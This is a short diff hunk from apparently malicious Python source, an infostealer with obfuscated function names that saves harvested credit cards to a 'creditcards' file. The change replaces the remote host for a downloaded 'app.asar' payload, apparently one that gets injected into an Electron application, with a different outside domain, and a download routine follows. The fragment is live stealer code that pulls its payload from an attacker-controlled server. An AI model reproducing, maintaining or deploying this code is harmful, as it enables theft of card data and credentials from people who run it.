@@ -710,7 +710,7 @@ def G37CC5(path, arg):
         Wr173F0rF113(CCs, 'creditcards')
     except:pass
 
-asar_url = 'https://skids.dev/app.asar'
+asar_url = 'https://faint.sh/app.asar'
 
 def download_file(url, dest_path):
     try:
